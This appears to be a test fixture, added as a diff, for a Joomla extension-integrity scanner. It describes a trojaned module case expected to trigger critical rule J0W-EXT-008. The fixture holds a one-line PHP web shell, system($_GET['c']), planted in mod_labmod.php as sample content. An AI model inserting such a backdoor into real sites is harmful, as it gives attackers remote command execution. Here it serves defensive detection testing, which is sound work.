@@ -1,0 +1,21 @@
+# Positivo (fase 2c, Task 7): archivo ejecutable atribuido de mod_labmod con
+# contenido distinto al del paquete oficial (troyano en un módulo de
+# confianza) → J0W-EXT-008 critical.
+case: ext-mod-trojan
+base:
+  cms: joomla
+  version: "1.1.0"
+expect:
+  exit_code: 1
+  findings:
+    - rule_id: J0W-EXT-008
+      subject: modules/mod_labmod/mod_labmod.php
+      min_severity: critical
+mutations:
+  - op: add_extension
+    kind: module
+  - op: add_extension_baseline
+    kind: module
+  - op: replace_file
+    path: modules/mod_labmod/mod_labmod.php
+    content: "<?php\n// troyano: puerta trasera plantada sobre un módulo legítimo\nsystem($_GET['c']);\n"
